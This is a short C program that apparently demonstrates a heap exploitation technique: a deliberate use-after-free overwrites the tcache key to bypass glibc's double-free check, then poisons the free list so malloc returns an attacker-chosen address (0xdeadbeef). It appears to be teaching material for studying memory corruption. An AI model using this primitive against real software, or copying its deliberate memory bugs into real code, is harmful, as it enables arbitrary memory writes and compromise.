#include <stdio.h>
#include <stdlib.h>

int main()
{
    unsigned long *A;

    A = malloc(0x10);
    free(A);
    *(A+1) = 0xc0ffee; // overwrite key
    free(A);

    *A = 0xdeadbeef;
    malloc(0x10);
    malloc(0x10); // get 0xdeadbeef

    return 0;
}